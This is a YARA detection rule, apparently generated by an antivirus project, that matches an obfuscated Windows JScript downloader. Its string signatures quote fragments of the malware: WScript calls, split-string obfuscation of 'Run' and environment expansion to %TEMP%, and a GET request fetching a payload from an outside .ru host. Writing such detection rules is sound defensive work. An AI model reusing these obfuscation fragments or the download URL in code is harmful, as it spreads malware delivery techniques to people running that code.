rule sig_20160428_08ee34f2634066b424e13f92ca53751a {
  meta:
    description = "datamaliciousorder - file 20160428_08ee34f2634066b424e13f92ca53751a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "41d1bb29bd79ec88e4d1eac1efc62c976f437e172fd0bf8ae00970962a117e55"

  strings:
    $s1  = "function AjcUthXgyAhlHauXwjOvk(TipPjrKboPyyDzgCloDzf){XqhFovKzvYtdOkiFbrHpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function RmbUppHkwVwiQcnTiiKjs() {return XqhFovKzvYtdOkiFbrHpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function AjcUthXgyAhlHauXwjOvk(TipPjrKboPyyDzgCloDzf){XqhFovKzvYtdOkiFbrHpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return DcyRapQniCjpZrfBelRln - EhlMcvTvdQxpPkrAdfKlg;};" fullword ascii
    $s5  = "var XqhFovKzvYtdOkiFbrHpi = function FbkVfnXrvDuvNtuKioGzk() {return YzyWqfKsyTfyOcfGjeDva[XccLhuKqgKttVxgBuhObv](\"WScript\"+\"" ascii
    $s6  = "function OmzJbyPxnIrdSvjNoqQrp(DcyRapQniCjpZrfBelRln, EhlMcvTvdQxpPkrAdfKlg){UtsXptNrnPbpNrgEwqDtv = UtsXptNrnPbpNrgEwqDtv * 1; " ascii
    $s7  = "var YzyWqfKsyTfyOcfGjeDva = this[\"WScript\"];" fullword ascii
    $s8  = "var XqhFovKzvYtdOkiFbrHpi = function FbkVfnXrvDuvNtuKioGzk() {return YzyWqfKsyTfyOcfGjeDva[XccLhuKqgKttVxgBuhObv](\"WScript\"+\"" ascii
    $s9  = "function RmbUppHkwVwiQcnTiiKjs() {return XqhFovKzvYtdOkiFbrHpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function RhiMsjGsdApdIetTfqUhw(){return SdfHnlGnxPhiKhkHrdYrz + \"\";};" fullword ascii
    $s11 = "if (BbkXimKpkXvwQlpLszMks[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function OmzJbyPxnIrdSvjNoqQrp(DcyRapQniCjpZrfBelRln, EhlMcvTvdQxpPkrAdfKlg){UtsXptNrnPbpNrgEwqDtv = UtsXptNrnPbpNrgEwqDtv * 1; " ascii
    $s13 = "function UcwFveZtmDvsCsoYmaDft() {return ((NiwVdyHcrYrbYwxWgjLjf == true) && (NiwVdyHcrYrbYwxWgjLjf == CgiQnqPgmNyeMzpKvrGjj)) ?" ascii
    $s14 = "function UcwFveZtmDvsCsoYmaDft() {return ((NiwVdyHcrYrbYwxWgjLjf == true) && (NiwVdyHcrYrbYwxWgjLjf == CgiQnqPgmNyeMzpKvrGjj)) ?" ascii
    $s15 = "BbkXimKpkXvwQlpLszMks[RgsTqxMtfShwTfiPtwMyd](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s16 = "var IkqRgdCiaLolSxgZjtDoy = false;" fullword ascii
    $s17 = "}while (VavJrqSvrTolNowRkrLik);" fullword ascii
    $s18 = "var CgiQnqPgmNyeMzpKvrGjj = false;" fullword ascii
    $s19 = "CgiQnqPgmNyeMzpKvrGjj = true; " fullword ascii
    $s20 = "function KgeOibOniKhsPovZppBdq(LqbAufPwpQruZlyDtuWhe) {var ZstNqmQlfCvlQwsQbsVms = (1, 2, 3, 4, 5, LqbAufPwpQruZlyDtuWhe); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}